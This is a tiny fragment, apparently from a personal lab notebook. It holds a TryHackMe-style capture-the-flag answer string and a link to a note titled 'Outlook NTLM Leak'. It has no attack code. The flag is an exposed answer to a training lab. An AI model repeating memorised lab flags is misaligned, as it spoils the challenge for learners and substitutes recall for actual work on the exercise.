*THM{Looking_Back_Is_Not_Always_Bad}*


[[Outlook NTLM Leak]]